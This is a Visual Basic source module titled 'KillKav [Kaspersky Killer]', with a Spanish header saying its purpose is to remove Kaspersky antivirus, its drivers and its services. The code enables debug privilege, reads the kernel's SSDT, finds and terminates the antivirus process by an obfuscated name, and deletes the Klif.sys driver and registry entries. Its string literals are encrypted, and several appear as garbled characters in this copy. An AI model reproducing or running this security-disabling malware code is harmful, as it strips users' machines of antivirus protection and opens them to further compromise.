Attribute VB_Name = "mMain"
'---------------------------------------------------------------------------------------
' Projecto    : KillKav [Kaspersky Killer]
' Fecha       : 19/03/2009 18:10
' Autor       : XcryptOR
' Proposito   : Elimina el antivirus kaspersky incluido sus drivers y servicios
' Bugs        : Al Eliminar la entrada de Klim5.sys que es el filtro NDIS
'               No se va a poder ingresar normalmente a internet, toca ir a las propiedades
'               del adaptador de red y desinstalar el Kaspersky Anti-Virus NDIS Filter
'---------------------------------------------------------------------------------------
Private Sub Main()
    EnablePrivilege SE_DEBUG_PRIVILEGE, True
    FindNtdllExport
    GetSSDT
    Fuck_KAV
    KillRegs
    
End Sub
Private Sub Fuck_KAV()
    Dim hProcess        As Long
    Dim Pid             As Long
    
    Pid = GetPIDByName(Crypt("�������"))
        
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, False, Pid)
    If hProcess = 0 Then
            hProcess = LzOpenProcess(PROCESS_ALL_ACCESS, Pid)
    End If
    
    Call MyTerminateProcess(hProcess, 0)
    
    If DeleteDriver(Crypt("��焛ℏ��������������ꄜ���������������")) = True Then '\??\C:\Windows\System32\Drivers\Klif.sys
            MsgBox Crypt("��������������������������������������") & vbCrLf & _
                   Crypt("�������������������������������������������y"), _
                   vbExclamation, Crypt("������������������������������������")
    End If
End Sub

